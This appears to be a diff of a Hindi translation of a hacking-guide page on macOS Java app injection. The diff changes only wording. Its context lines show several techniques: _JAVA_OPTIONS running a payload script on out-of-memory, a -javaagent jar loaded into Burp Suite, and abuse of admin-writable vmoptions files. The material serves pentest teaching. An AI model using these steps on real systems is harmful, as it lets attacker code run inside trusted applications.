@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Enumeration
 
-अपने सिस्टम में स्थापित Java अनुप्रयोगों को खोजें। यह देखा गया कि **Info.plist** में Java ऐप्स कुछ जावा पैरामीटर शामिल करेंगे जिनमें स्ट्रिंग **`java.`** होगी, इसलिए आप इसके लिए खोज सकते हैं:
+अपने सिस्टम में स्थापित Java अनुप्रयोगों को खोजें। यह देखा गया कि **Info.plist** में Java ऐप्स कुछ जावा पैरामीटर शामिल करेंगे जिनमें स्ट्रिंग **`java.`** होगी, इसलिए आप इसके लिए खोज कर सकते हैं:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -27,13 +27,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-env वेरिएबल **`_JAVA_OPTIONS`** का उपयोग किसी java संकलित ऐप के निष्पादन में मनमाने java पैरामीटर को इंजेक्ट करने के लिए किया जा सकता है:
+env वेरिएबल **`_JAVA_OPTIONS`** का उपयोग java संकलित ऐप के निष्पादन में मनमाने java पैरामीटर को इंजेक्ट करने के लिए किया जा सकता है:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-नई प्रक्रिया के रूप में इसे निष्पादित करने के लिए और वर्तमान टर्मिनल के बच्चे के रूप में नहीं, आप उपयोग कर सकते हैं:
+इसे एक नए प्रोसेस के रूप में चलाने के लिए और वर्तमान टर्मिनल के बच्चे के रूप में नहीं, आप उपयोग कर सकते हैं:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -96,7 +96,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-एजेंट को **विभिन्न Java संस्करण** के साथ बनाना एप्लिकेशन और एजेंट दोनों के निष्पादन को क्रैश कर सकता है
+एजेंट को **विभिन्न Java संस्करण** के साथ बनाना एजेंट और एप्लिकेशन दोनों के निष्पादन को क्रैश कर सकता है
 {% endhint %}
 
 जहाँ एजेंट हो सकता है:
@@ -125,14 +125,14 @@ err.printStackTrace();
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-With `manifest.txt`:
+`manifest.txt`:
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-और फिर env वेरिएबल को एक्सपोर्ट करें और जावा एप्लिकेशन को इस तरह चलाएं:
+और फिर env वेरिएबल को एक्सपोर्ट करें और जावा एप्लिकेशन को इस तरह चलाएँ:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -146,7 +146,7 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 यह फ़ाइल **Java params** के विनिर्देशन का समर्थन करती है जब Java निष्पादित होता है। आप कुछ पिछले ट्रिक्स का उपयोग करके java params को बदल सकते हैं और **प्रक्रिया को मनमाने आदेश निष्पादित करने** के लिए बना सकते हैं।\
 इसके अलावा, यह फ़ाइल `include` निर्देशिका के साथ **अन्य फ़ाइलों को भी शामिल** कर सकती है, इसलिए आप एक शामिल फ़ाइल को भी बदल सकते हैं।
 
-यहां तक कि, कुछ Java ऐप्स **एक से अधिक `vmoptions`** फ़ाइलें लोड करेंगे।
+और भी, कुछ Java ऐप्स **एक से अधिक `vmoptions`** फ़ाइलें लोड करेंगे।
 
 कुछ अनुप्रयोग जैसे Android Studio अपने **आउटपुट में यह संकेत करते हैं कि वे इन फ़ाइलों के लिए कहाँ देख रहे हैं**, जैसे:
 ```bash
@@ -167,4 +167,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-नोट करें कि इस उदाहरण में Android Studio फ़ाइल **`/Applications/Android Studio.app.vmoptions`** को लोड करने की कोशिश कर रहा है, एक ऐसा स्थान जहाँ **`admin` समूह** के किसी भी उपयोगकर्ता को लिखने की अनुमति है।
+नोट करें कि इस उदाहरण में Android Studio फ़ाइल **`/Applications/Android Studio.app.vmoptions`** लोड करने की कोशिश कर रहा है, एक ऐसा स्थान जहाँ **`admin` समूह** के किसी भी उपयोगकर्ता को लिखने की अनुमति है।
